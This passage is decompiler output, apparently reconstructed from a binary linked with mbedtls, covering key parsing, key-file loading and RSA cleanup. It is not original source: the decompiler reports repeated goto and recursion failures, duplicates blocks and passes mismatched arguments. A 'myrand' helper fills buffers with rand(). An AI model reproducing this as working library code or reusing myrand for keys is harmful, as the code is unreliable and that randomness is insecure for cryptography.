                                                        // 0x804eae5
                                                        g5 = v3;
                                                        return g3;
                                                    }
                                                }
                                            }
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x804eac1
                                    g4 = g5;
                                    g1 = a1;
                                    g6 = a2;
                                    v14 = (int32_t)v32;
                                    v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                                    g3 = v6;
                                    if (v6 != 0) {
                                        // 0x804ed88
                                        v15 = a1;
                                        g1 = v15;
                                        mbedtls_pk_free((char *)v15);
                                        if (g3 != -0x3b80) {
                                            // 0x804ed9f
                                            g6 = a2;
                                            g4 = g5;
                                            g1 = a1;
                                            v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                            g1 = v7;
                                            g3 = v7;
                                            if (v7 != 0) {
                                                // 0x804edb6
                                                mbedtls_pk_free((char *)a1);
                                                v8 = mbedtls_pk_info_from_type(1);
                                                if (v8 == 0) {
                                                    // 0x804ec40
                                                    g5 = v3;
                                                    return -0x3c80;
                                                }
                                                // 0x804edd5
                                                v16 = a1;
                                                v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                                g3 = v9;
                                                if (v9 == 0) {
                                                    // 0x804ee27
                                                    g4 = g5;
                                                    g1 = *(int32_t *)(a1 + 4);
                                                    g6 = a2;
                                                    if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                                        // 0x804ee3f
                                                        v17 = a1;
                                                        g1 = v17;
                                                        mbedtls_pk_free((char *)v17);
                                                        v10 = mbedtls_pk_info_from_type(2);
                                                        if (v10 == 0) {
                                                            // 0x804ec40
                                                            g5 = v3;
                                                            return -0x3c80;
                                                        }
                                                        // 0x804ee5e
                                                        v18 = a1;
                                                        g6 = v18;
                                                        if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                            // 0x804ee75
                                                            g4 = g5;
                                                            g1 = *(int32_t *)(a1 + 4);
                                                            g6 = a2;
                                                            v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                            g3 = v11;
                                                            if (v11 != 0) {
                                                                // 0x804ee8f
                                                                v19 = a1;
                                                                g1 = v19;
                                                                g3 = -0x3d00;
                                                                mbedtls_pk_free((char *)v19);
                                                                // branch -> 0x804eae5
                                                            }
                                                        }
                                                    }
                                                } else {
                                                    // 0x804edea
                                                    g3 = 0;
                                                    // branch -> 0x804eae5
                                                }
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                        }
                                    }
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x804ec25
                            mbedtls_pem_free((char *)g7);
                            g5 = v3;
                            return g3;
                        }
                        v32 = v33;
                    }
                    // 0x804eac1
                    g4 = g5;
                    g1 = a1;
                    g6 = a2;
                    v14 = (int32_t)v32;
                    v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, a4);
                    g3 = v6;
                    if (v6 != 0) {
                        // 0x804ed88
                        v15 = a1;
                        g1 = v15;
                        mbedtls_pk_free((char *)v15);
                        if (g3 != -0x3b80) {
                            // 0x804ed9f
                            g6 = a2;
                            g4 = g5;
                            g1 = a1;
                            v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                            g1 = v7;
                            g3 = v7;
                            if (v7 != 0) {
                                // 0x804edb6
                                mbedtls_pk_free((char *)a1);
                                v8 = mbedtls_pk_info_from_type(1);
                                if (v8 == 0) {
                                    // 0x804ec40
                                    g5 = v3;
                                    return -0x3c80;
                                }
                                // 0x804edd5
                                v16 = a1;
                                v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                g3 = v9;
                                if (v9 == 0) {
                                    // 0x804ee27
                                    g4 = g5;
                                    g1 = *(int32_t *)(a1 + 4);
                                    g6 = a2;
                                    if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                        // 0x804ee3f
                                        v17 = a1;
                                        g1 = v17;
                                        mbedtls_pk_free((char *)v17);
                                        v10 = mbedtls_pk_info_from_type(2);
                                        if (v10 == 0) {
                                            // 0x804ec40
                                            g5 = v3;
                                            return -0x3c80;
                                        }
                                        // 0x804ee5e
                                        v18 = a1;
                                        g6 = v18;
                                        if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                            // 0x804ee75
                                            g4 = g5;
                                            g1 = *(int32_t *)(a1 + 4);
                                            g6 = a2;
                                            v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                            g3 = v11;
                                            if (v11 != 0) {
                                                // 0x804ee8f
                                                v19 = a1;
                                                g1 = v19;
                                                g3 = -0x3d00;
                                                mbedtls_pk_free((char *)v19);
                                                // branch -> 0x804eae5
                                            }
                                        }
                                    }
                                } else {
                                    // 0x804edea
                                    g3 = 0;
                                    // branch -> 0x804eae5
                                }
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                        }
                    }
                }
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // Detected a possible infinite recursion (goto support failed); quitting...
        // 0x804ec25
        mbedtls_pem_free((char *)g7);
        g5 = v3;
        return g3;
    }
    // 0x804eb18
    // branch -> 0x804eb1c
    // 0x804eb1c
    v21 = (char *)(v34 + v20);
    if (*v21 == 0) {
        // 0x804eb28
        v36 = g7;
        v22 = mbedtls_pem_read_buffer((int32_t *)v36, "-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----", a2, 0, 0, &v30);
        g3 = v22;
        if (v22 == 0) {
            // 0x804eb71
            g4 = v31;
            g6 = v4;
            g1 = a1;
            v23 = pk_parse_key_pkcs8_unencrypted_der(v36, (int32_t)"-----BEGIN PRIVATE KEY-----", (int32_t)"-----END PRIVATE KEY-----");
            g1 = v23;
            g3 = v23;
            if (v23 != 0) {
                // 0x804eb89
                mbedtls_pk_free((char *)a1);
                // branch -> 0x804ec25
            }
        } else {
            // 0x804ecdb
            if (v22 == -0x1080) {
                // 0x804ece6
                v32 = "-----END PRIVATE KEY-----";
                if (*v21 == 0) {
                    // 0x804ecef
                    v28 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN ENCRYPTED PRIVATE KEY-----", "-----END ENCRYPTED PRIVATE KEY-----", a2, 0, 0, &v30);
                    g3 = v28;
                    if (v28 == 0) {
                        // 0x804ed28
                        g4 = v31;
                        g6 = v4;
                        g1 = a1;
                        v29 = pk_parse_key_pkcs8_encrypted_der(a4, a5, (int32_t)"-----END ENCRYPTED PRIVATE KEY-----", a2, 0);
                        g1 = v29;
                        g3 = v29;
                        if (v29 != 0) {
                            // 0x804eb89
                            mbedtls_pk_free((char *)a1);
                            // branch -> 0x804ec25
                        }
                        // 0x804ec25
                        mbedtls_pem_free((char *)g7);
                        g5 = v3;
                        return g3;
                    }
                    // 0x804ed63
                    if (v28 == -0x1080) {
                        v32 = "-----END ENCRYPTED PRIVATE KEY-----";
                        // 0x804eac1
                        g4 = g5;
                        g1 = a1;
                        g6 = a2;
                        v14 = (int32_t)v32;
                        v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                        g3 = v6;
                        if (v6 != 0) {
                            // 0x804ed88
                            v15 = a1;
                            g1 = v15;
                            v44 = v15;
                            mbedtls_pk_free((char *)v15);
                            if (g3 != -0x3b80) {
                                // 0x804ed9f
                                g6 = a2;
                                g4 = g5;
                                g1 = a1;
                                v7 = pk_parse_key_pkcs8_unencrypted_der(v44, a5, v14);
                                g1 = v7;
                                g3 = v7;
                                if (v7 != 0) {
                                    // 0x804edb6
                                    mbedtls_pk_free((char *)a1);
                                    v8 = mbedtls_pk_info_from_type(1);
                                    if (v8 == 0) {
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x804edd5
                                    v16 = a1;
                                    v44 = v16;
                                    v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                    g3 = v9;
                                    if (v9 == 0) {
                                        // 0x804ee27
                                        g4 = g5;
                                        g1 = *(int32_t *)(a1 + 4);
                                        g6 = a2;
                                        if (pk_parse_key_pkcs1_der(v44, v8, v14) != 0) {
                                            // 0x804ee3f
                                            v17 = a1;
                                            g1 = v17;
                                            mbedtls_pk_free((char *)v17);
                                            v10 = mbedtls_pk_info_from_type(2);
                                            if (v10 == 0) {
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x804ee5e
                                            v18 = a1;
                                            g6 = v18;
                                            v44 = v18;
                                            if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                // 0x804ee75
                                                g4 = g5;
                                                g1 = *(int32_t *)(a1 + 4);
                                                g6 = a2;
                                                v11 = pk_parse_key_sec1_der(v44, v10, v14);
                                                g3 = v11;
                                                if (v11 != 0) {
                                                    // 0x804ee8f
                                                    v19 = a1;
                                                    g1 = v19;
                                                    g3 = -0x3d00;
                                                    mbedtls_pk_free((char *)v19);
                                                    // branch -> 0x804eae5
                                                }
                                            }
                                        }
                                    } else {
                                        // 0x804edea
                                        g3 = 0;
                                        // branch -> 0x804eae5
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                        }
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // 0x804eac1
                g4 = g5;
                g1 = a1;
                g6 = a2;
                v14 = (int32_t)v32;
                v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                g3 = v6;
                if (v6 != 0) {
                    // 0x804ed88
                    v15 = a1;
                    g1 = v15;
                    mbedtls_pk_free((char *)v15);
                    if (g3 != -0x3b80) {
                        // 0x804ed9f
                        g6 = a2;
                        g4 = g5;
                        g1 = a1;
                        v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                        g1 = v7;
                        g3 = v7;
                        if (v7 != 0) {
                            // 0x804edb6
                            mbedtls_pk_free((char *)a1);
                            v8 = mbedtls_pk_info_from_type(1);
                            if (v8 == 0) {
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x804edd5
                            v16 = a1;
                            v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                            g3 = v9;
                            if (v9 == 0) {
                                // 0x804ee27
                                g4 = g5;
                                g1 = *(int32_t *)(a1 + 4);
                                g6 = a2;
                                if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                    // 0x804ee3f
                                    v17 = a1;
                                    g1 = v17;
                                    mbedtls_pk_free((char *)v17);
                                    v10 = mbedtls_pk_info_from_type(2);
                                    if (v10 == 0) {
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // 0x804ee5e
                                    v18 = a1;
                                    g6 = v18;
                                    if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                        // 0x804ee75
                                        g4 = g5;
                                        g1 = *(int32_t *)(a1 + 4);
                                        g6 = a2;
                                        v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                        g3 = v11;
                                        if (v11 != 0) {
                                            // 0x804ee8f
                                            v19 = a1;
                                            g1 = v19;
                                            g3 = -0x3d00;
                                            mbedtls_pk_free((char *)v19);
                                            // branch -> 0x804eae5
                                        }
                                    }
                                }
                            } else {
                                // 0x804edea
                                g3 = 0;
                                // branch -> 0x804eae5
                            }
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                    }
                }
            }
            // Detected a possible infinite recursion (goto support failed); quitting...
        }
        // 0x804ec25
        mbedtls_pem_free((char *)g7);
        g5 = v3;
        return g3;
    }
    // 0x804eac1
    g4 = g5;
    g1 = a1;
    g6 = a2;
    v14 = (int32_t)v2;
    v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, v13, v12);
    g3 = v6;
    if (v6 != 0) {
        // 0x804ed88
        v15 = a1;
        g1 = v15;
        mbedtls_pk_free((char *)v15);
        if (g3 != -0x3b80) {
            // 0x804ed9f
            g6 = a2;
            g4 = g5;
            g1 = a1;
            v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
            g1 = v7;
            g3 = v7;
            if (v7 != 0) {
                // 0x804edb6
                mbedtls_pk_free((char *)a1);
                v8 = mbedtls_pk_info_from_type(1);
                if (v8 == 0) {
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // 0x804edd5
                v16 = a1;
                v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                g3 = v9;
                if (v9 == 0) {
                    // 0x804ee27
                    g4 = g5;
                    g1 = *(int32_t *)(a1 + 4);
                    g6 = a2;
                    if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                        // 0x804ee3f
                        v17 = a1;
                        g1 = v17;
                        mbedtls_pk_free((char *)v17);
                        v10 = mbedtls_pk_info_from_type(2);
                        if (v10 == 0) {
                            // Detected a possible infinite recursion (goto support failed); quitting...
                        }
                        // 0x804ee5e
                        v18 = a1;
                        g6 = v18;
                        if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                            // 0x804ee75
                            g4 = g5;
                            g1 = *(int32_t *)(a1 + 4);
                            g6 = a2;
                            v11 = pk_parse_key_sec1_der(v18, v10, v14);
                            g3 = v11;
                            if (v11 != 0) {
                                // 0x804ee8f
                                v19 = a1;
                                g1 = v19;
                                g3 = -0x3d00;
                                mbedtls_pk_free((char *)v19);
                                // branch -> 0x804eae5
                            }
                        }
                    }
                } else {
                    // 0x804edea
                    g3 = 0;
                    // branch -> 0x804eae5
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
        }
    }
    // Detected a possible infinite recursion (goto support failed); quitting...
    // Detected a possible infinite recursion (goto support failed); quitting...
    // Detected a possible infinite recursion (goto support failed); quitting...
    // Detected a possible infinite recursion (goto support failed); quitting...
}

// Address range: 0x804eeb0 - 0x804f08f
int32_t mbedtls_pk_parse_subpubkey(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x804eeb6
    g5 = (int32_t)a1;
    int32_t v2;
    int32_t v3 = &v2; // 0x804eec2_0
    g7 = v3;
    int32_t v4 = g3; // 0x804eec5
    int32_t v5 = 0; // bp-36
    int32_t v6 = mbedtls_asn1_get_tag(a1, a2, v3, 48); // 0x804eee2
    g3 = v6 - 0x3d00;
    int32_t result; // 0x804eef1
    if (v6 == 0) {
        int32_t v7 = g5; // 0x804ef00
        g4 = &v5;
        int32_t v8 = v2 + *(int32_t *)v7; // 0x804ef08
        g6 = v8;
        int32_t v9;
        int32_t v10 = &v9; // 0x804ef10_0
        g1 = v7;
        int32_t v11 = pk_get_pk_alg(&v9, a2, v3); // 0x804ef18
        g3 = v11;
        if (v11 == 0) {
            int32_t v12 = g7; // 0x804ef26
            int32_t v13 = mbedtls_asn1_get_bitstring_null((int32_t *)g5, v8, (int32_t *)v12); // 0x804ef31
            g3 = v13 - 0x3b00;
            if (v13 == 0) {
                int32_t v14 = v2 + *(int32_t *)g5; // 0x804ef42
                g7 = v14;
                if (v14 == v8) {
                    // 0x804ef51
                    g3 = -0x3c80;
                    int32_t v15 = mbedtls_pk_info_from_type(v5); // 0x804ef5c
                    if (v15 != 0) {
                        int32_t v16 = mbedtls_pk_setup((int32_t *)a3, v15); // 0x804ef6f
                        g3 = v16;
                        if (v16 == 0) {
                            int32_t v17 = v5; // 0x804ef7e
                            int32_t v18;
                            if (v17 != 1) {
                                int32_t v19 = v17 - 2; // 0x804ef86
                                g1 = v19;
                                g7 = -0x3c80;
                                int32_t v20 = -0x3c80; // 0x804ef96
                                if (v19 < 2) {
                                    int32_t * v21 = (int32_t *)(a3 + 4); // 0x804efe3_0
                                    g6 = *v21;
                                    g1 = v10;
                                    int32_t v22 = pk_use_ecparams(a3, v15); // 0x804efe9
                                    g1 = v22;
                                    g7 = v10;
                                    if (v22 == 0) {
                                        // 0x804eff4
                                        g1 = g5;
                                        g4 = *v21;
                                        g6 = v8;
                                        int32_t v23 = pk_get_ecpubkey(a3, v15, v12); // 0x804efff
                                        g1 = v23;
                                        v18 = v23;
                                        // branch -> 0x804f006
                                        // 0x804f006
                                        g7 = v18;
                                        if (v18 == 0) {
                                            // 0x804f00a
                                            g1 = v8;
                                            if (v8 == *(int32_t *)g5) {
                                                // 0x804eef1
                                                result = g3;
                                                g3 = v4;
                                                g5 = v1;
                                                return result;
                                            }
                                            // 0x804efd9
                                            g7 = -0x3b66;
                                            v20 = -0x3b66;
                                            // branch -> 0x804ef93
                                        } else {
                                            v20 = v18;
                                        }
                                    } else {
                                        v20 = v10;
                                    }
                                }
                                // 0x804ef93
                                g3 = v20;
                                mbedtls_pk_free((char *)a3);
                                // branch -> 0x804eef1
                                // 0x804eef1
                                result = g3;
                                g3 = v4;
                                g5 = v1;
                                return result;
                            }
                            int32_t v24 = *(int32_t *)(a3 + 4); // 0x804efab
                            int32_t v25;
                            int32_t v26 = mbedtls_asn1_get_tag((int32_t *)g5, v8, (int32_t)&v25, 48); // 0x804efc7
                            g1 = v26;
                            if (v26 == 0) {
                                int32_t * v27 = (int32_t *)g5; // 0x804efd0_0
                                int32_t v28 = v25 + *v27; // 0x804efd2
                                g1 = v28;
                                if (g7 != v28) {
                                    // 0x804efd9
                                    g7 = -0x3b66;
                                    // branch -> 0x804ef93
                                    // 0x804ef93
                                    g3 = -0x3b66;
                                    mbedtls_pk_free((char *)a3);
                                    // branch -> 0x804eef1
                                    // 0x804eef1
                                    result = g3;
                                    g3 = v4;
                                    g5 = v1;
                                    return result;
                                }
                                int32_t v29 = v24 + 8; // 0x804f020
                                int32_t v30 = mbedtls_asn1_get_mpi(v27, v28, v29); // 0x804f02a
                                g1 = v30;
                                int32_t v31 = v30; // 0x804f033
                                if (v30 == 0) {
                                    int32_t v32 = mbedtls_asn1_get_mpi((int32_t *)g5, g7, v24 + 20); // 0x804f04c
                                    g1 = v32;
                                    if (v32 == 0) {
                                        // 0x804f055
                                        if (g7 != *(int32_t *)g5) {
                                            // 0x804efd9
                                            g7 = -0x3b66;
                                            // branch -> 0x804ef93
                                            // 0x804ef93
                                            g3 = -0x3b66;
                                            mbedtls_pk_free((char *)a3);
                                            // branch -> 0x804eef1
                                            // 0x804eef1
                                            result = g3;
                                            g3 = v4;
                                            g5 = v1;
                                            return result;
                                        }
                                        // 0x804f059
                                        g7 = -0x3b00;
                                        int32_t v33 = mbedtls_rsa_check_pubkey(v24); // 0x804f064
                                        g1 = v33;
                                        if (v33 == 0) {
                                            // 0x804f071
                                            *(int32_t *)(v24 + 4) = mbedtls_mpi_size(v29);
                                            // branch -> 0x804f00a
                                            // 0x804f00a
                                            g1 = v8;
                                            if (v8 != *(int32_t *)g5) {
                                                // 0x804efd9
                                                g7 = -0x3b66;
                                                // branch -> 0x804ef93
                                                // 0x804ef93
                                                g3 = -0x3b66;
                                                mbedtls_pk_free((char *)a3);
                                                // branch -> 0x804eef1
                                            }
                                        } else {
                                            // 0x804f059
                                            // branch -> 0x804ef93
                                            // 0x804ef93
                                            g3 = g7;
                                            mbedtls_pk_free((char *)a3);
                                            // branch -> 0x804eef1
                                        }
                                        // 0x804eef1
                                        result = g3;
                                        g3 = v4;
                                        g5 = v1;
                                        return result;
                                    }
                                    v31 = v32;
                                }
                                // 0x804f033
                                v18 = v31 - 0x3b00;
                                // branch -> 0x804f006
                                // 0x804f006
                                g7 = v18;
                                if (v18 == 0) {
                                    // 0x804f00a
                                    g1 = v8;
                                    if (v8 != *(int32_t *)g5) {
                                        // 0x804efd9
                                        g7 = -0x3b66;
                                        // branch -> 0x804ef93
                                        // 0x804ef93
                                        g3 = -0x3b66;
                                        mbedtls_pk_free((char *)a3);
                                        // branch -> 0x804eef1
                                    }
                                } else {
                                    // 0x804ef93
                                    g3 = v18;
                                    mbedtls_pk_free((char *)a3);
                                    // branch -> 0x804eef1
                                }
                                // 0x804eef1
                                result = g3;
                                g3 = v4;
                                g5 = v1;
                                return result;
                            }
                            // 0x804f033
                            v18 = v26 - 0x3b00;
                            // branch -> 0x804f006
                            // 0x804f006
                            g7 = v18;
                            if (v18 == 0) {
                                // 0x804f00a
                                g1 = v8;
                                if (v8 != *(int32_t *)g5) {
                                    // 0x804efd9
                                    g7 = -0x3b66;
                                    // branch -> 0x804ef93
                                    // 0x804ef93
                                    g3 = -0x3b66;
                                    mbedtls_pk_free((char *)a3);
                                    // branch -> 0x804eef1
                                }
                            } else {
                                // 0x804ef93
                                g3 = v18;
                                mbedtls_pk_free((char *)a3);
                                // branch -> 0x804eef1
                            }
                            // 0x804eef1
                            result = g3;
                            g3 = v4;
                            g5 = v1;
                            return result;
                        }
                    }
                } else {
                    // 0x804ef4a
                    g3 = -0x3b66;
                    // branch -> 0x804eef1
                }
                // 0x804eef1
                result = g3;
                g3 = v4;
                g5 = v1;
                return result;
            }
        }
    }
    // 0x804eef1
    result = g3;
    g3 = v4;
    g5 = v1;
    return result;
}

// Address range: 0x804f090 - 0x804f14f
int32_t mbedtls_pk_parse_public_key(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804f096
    g3 = a3;
    int32_t v2 = g5; // 0x804f09c
    int32_t v3;
    g5 = &v3;
    int32_t v4 = g7; // 0x804f0a2
    g7 = a2;
    mbedtls_pem_init(&v3);
    int32_t v5 = g3; // 0x804f0b0
    int32_t v6 = 0; // 0x804f0be
    int32_t v7;
    int32_t v8;
    int32_t v9; // 0x804f0be
    int32_t v10; // 0x804f0be
    int32_t result; // 0x804f0da
    if (v5 != 0) {
        int32_t v11 = g7; // 0x804f0b4
        if (*(char *)(v5 - 1 + v11) == 0) {
            // 0x804f0f8
            int32_t v12;
            int32_t v13 = mbedtls_pem_read_buffer((int32_t *)g5, "-----BEGIN PUBLIC KEY-----", "-----END PUBLIC KEY-----", v11, 0, 0, &v12); // 0x804f126
            if (v13 == 0) {
                // 0x804f12f
                g7 = v3;
                // branch -> 0x804f0bb
                // 0x804f0bb
                v9 = g7;
                int32_t v14;
                v10 = v9 + v14;
                g3 = v10;
                v7 = v9;
                result = mbedtls_pk_parse_subpubkey(&v7, v10, a1);
                // branch -> 0x804f0d7
            } else {
                // 0x804f137
                if (v13 == -0x1080) {
                    // 0x804f137
                    // branch -> 0x804f0bb
                    // 0x804f0bb
                    v9 = g7;
                    v10 = v9 + g3;
                    g3 = v10;
                    v7 = v9;
                    result = mbedtls_pk_parse_subpubkey(&v7, v10, a1);
                    // branch -> 0x804f0d7
                } else {
                    result = v13;
                }
            }
            // 0x804f0d7
            mbedtls_pem_free((char *)g5);
            g1 = result;
            g3 = v1;
            g7 = v4;
            g5 = v2;
            g2 = v8;
            return result;
        }
        v6 = v5;
    }
    // 0x804f0bb
    v9 = g7;
    v10 = v9 + v6;
    g3 = v10;
    v7 = v9;
    result = mbedtls_pk_parse_subpubkey(&v7, v10, a1);
    // branch -> 0x804f0d7
    // 0x804f0d7
    mbedtls_pem_free((char *)g5);
    g1 = result;
    g3 = v1;
    g7 = v4;
    g5 = v2;
    g2 = v8;
    return result;
}

// Address range: 0x804f150 - 0x804f27f
int32_t mbedtls_pk_load_file(struct _IO_FILE * a1, int32_t * a2, int32_t * a3) {
    int32_t v1 = g3; // 0x804f155
    int32_t str = (int32_t)a2; // edi
    int32_t v2 = (int32_t)a3; // esi
    struct _IO_FILE * stream = fopen64((char *)a1, "rb"); // 0x804f16d
    int32_t stream2 = (int32_t)stream; // ebx
    if (stream == NULL) {
        // 0x804f22e
        g3 = v1;
        return -0x3e00;
    }
    // 0x804f181
    fseek(stream, 0, SEEK_END);
    int32_t curr_file_offset = ftell((struct _IO_FILE *)stream2); // 0x804f19c
    struct _IO_FILE * file = (struct _IO_FILE *)stream2;
    if (curr_file_offset == -1) {
        // 0x804f268
        fclose(file);
        // branch -> 0x804f22e
        // 0x804f22e
        g3 = v1;
        return -0x3e00;
    }
    // 0x804f1aa
    fseek(file, 0, SEEK_SET);
    *(int32_t *)v2 = curr_file_offset;
    char * mem = calloc(1, curr_file_offset + 1); // 0x804f1d8
    *(int32_t *)str = (int32_t)mem;
    struct _IO_FILE * file2 = (struct _IO_FILE *)stream2;
    if (mem == NULL) {
        // 0x804f258
        fclose(file2);
        // branch -> 0x804f22e
        // 0x804f22e
        g3 = v1;
        return -0x3f80;
    }
    int32_t v3 = fread_unlocked(mem, 1, *(int32_t *)v2, file2); // 0x804f1f8
    fclose((struct _IO_FILE *)stream2);
    int32_t v4 = *(int32_t *)str; // 0x804f209
    int32_t result; // 0x804f235_2
    if (v3 == *(int32_t *)v2) {
        // 0x804f201
        *(char *)(*(int32_t *)v2 + v4) = 0;
        if (strstr((char *)*(int32_t *)str, "-----BEGIN ") != NULL) {
            int32_t * v5 = (int32_t *)v2; // 0x804f22b_0
            *v5 = *v5 + 1;
            result = 0;
            // branch -> 0x804f22e
        } else {
            result = 0;
        }
    } else {
        // 0x804f238
        free((char *)v4);
        result = -0x3e00;
        // branch -> 0x804f22e
    }
    // 0x804f22e
    g3 = v1;
    return result;
}

// Address range: 0x804f280 - 0x804f2ef
int32_t mbedtls_pk_parse_public_keyfile(char * a1, int32_t a2, int32_t a3) {
    // 0x804f280
    int32_t v1;
    char * v2 = (char *)v1; // bp-20
    int32_t v3;
    int32_t result = mbedtls_pk_load_file((struct _IO_FILE *)a2, (int32_t *)&v2, &v3); // 0x804f29a
    if (result != 0) {
        // 0x804f2a3
        return result;
    }
    int32_t result2 = mbedtls_pk_parse_public_key((int32_t)a1, (int32_t)v2, v3); // 0x804f2bc
    int32_t v4 = (int32_t)v2;
    if (v3 == 0) {
        // 0x804f2de
        free((char *)v4);
        return result2;
    }
    *(char *)v4 = 0;
    int32_t v5 = v4 + 1; // 0x804f2d3
    int32_t v6 = v3 - 1; // 0x804f2d6
    while (v6 != 0) {
        // 0x804f2d0
        *(char *)v5 = 0;
        v5++;
        v6--;
        // continue -> 0x804f2d0
    }
    // 0x804f2db
    // branch -> 0x804f2de
    // 0x804f2de
    free((char *)(int32_t)v2);
    return result2;
}

// Address range: 0x804f2f0 - 0x804f38f
int32_t mbedtls_pk_parse_keyfile(char * a1, int32_t a2, int32_t a3) {
    // 0x804f2f0
    int32_t v1;
    char * v2 = (char *)v1; // bp-20
    int32_t v3 = g7; // 0x804f2f3
    int32_t v4 = g3; // 0x804f2f4
    g7 = (int32_t)a1;
    g3 = a3;
    int32_t v5;
    int32_t v6 = mbedtls_pk_load_file((struct _IO_FILE *)a2, (int32_t *)&v2, &v5); // 0x804f312
    int32_t result = v6; // 0x804f372_2
    if (v6 == 0) {
        int32_t str = g3; // 0x804f31b
        int32_t len = 0;
        int32_t v7 = 0;
        if (str != 0) {
            // 0x804f31f
            len = strlen((char *)str);
            v7 = g3;
            // branch -> 0x804f32f
        }
        int32_t v8 = mbedtls_pk_parse_key(g7, (int32_t)v2, v5, v7, len); // 0x804f340
        int32_t v9 = (int32_t)v2;
        if (v5 != 0) {
            *(char *)v9 = 0;
            int32_t v10 = v5 - 1; // 0x804f356
            while (v10 != 0) {
                // 0x804f350
                v9++;
                *(char *)v9 = 0;
                v10--;
                // continue -> 0x804f350
            }
            // 0x804f35b
            // branch -> 0x804f35e
        }
        // 0x804f35e
        free((char *)(int32_t)v2);
        result = v8;
        // branch -> 0x804f36c
    }
    // 0x804f36c
    g3 = v4;
    g7 = v3;
    return result;
}

// Address range: 0x804f390 - 0x804f3af
int32_t mbedtls_rsa_set_padding(int32_t result, int32_t a2, int32_t a3) {
    // 0x804f390
    g1 = result;
    *(int32_t *)(result + 164) = a2;
    g6 = a3;
    *(int32_t *)(result + 168) = a3;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x804f3b0 - 0x804f3e0
int32_t myrand(int32_t a1, int32_t a2) {
    // 0x804f3b0
    int32_t v1;
    if (v1 == 0) {
        // 0x804f3d7
        return 0;
    }
    int32_t v2 = 0; // ebx
    *(char *)(v2 + a2) = (char)rand();
    int32_t v3 = v2 + 1; // 0x804f3d0
    v2 = v3;
    // branch -> 0x804f3c8
    while (v1 > v3) {
        // 0x804f3c8
        *(char *)(v2 + a2) = (char)rand();
        v3 = v2 + 1;
        v2 = v3;
        // continue -> 0x804f3c8
    }
    // 0x804f3d7
    // branch -> 0x804f3d7
    // 0x804f3d7
    return 0;
}

// Address range: 0x804f3e1 - 0x804f3ef
int32_t function_804f3e1(void) {
    int32_t result = mbedtls_rsa_free(0, 0); // 0x804f3e1
    g1 = result;
    return result;
}

// Address range: 0x804f3f0 - 0x804f49f
int32_t mbedtls_rsa_free(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // bp-8
    g3 = a1;
    int32_t v2 = a1 + 140; // 0x804f3fa
    g1 = v2;
    mbedtls_mpi_free((int32_t *)v2);
    int32_t v3 = g3 + 152; // 0x804f408
    g1 = v3;
    mbedtls_mpi_free((int32_t *)v3);
    int32_t v4 = g3 + 128; // 0x804f416
    g1 = v4;
    mbedtls_mpi_free((int32_t *)v4);
    int32_t v5 = g3 + 116; // 0x804f424
    g1 = v5;
    mbedtls_mpi_free((int32_t *)v5);
    int32_t v6 = g3 + 104; // 0x804f42f
    g1 = v6;
    mbedtls_mpi_free((int32_t *)v6);
    int32_t v7 = g3 + 92; // 0x804f43a
    g1 = v7;
    mbedtls_mpi_free((int32_t *)v7);
    int32_t v8 = g3 + 80; // 0x804f445
    g1 = v8;
    mbedtls_mpi_free((int32_t *)v8);
    int32_t v9 = g3 + 68; // 0x804f450
    g1 = v9;
    mbedtls_mpi_free((int32_t *)v9);
    int32_t v10 = g3 + 56; // 0x804f45b
    g1 = v10;
    mbedtls_mpi_free((int32_t *)v10);
    int32_t v11 = g3 + 44; // 0x804f466
    g1 = v11;
    mbedtls_mpi_free((int32_t *)v11);
    int32_t v12 = g3 + 32; // 0x804f471
    g1 = v12;
    mbedtls_mpi_free((int32_t *)v12);
    int32_t v13 = g3; // 0x804f47c
    int32_t v14 = v13 + 20; // 0x804f47c
    g1 = v14;
    g3 = v13 + 8;
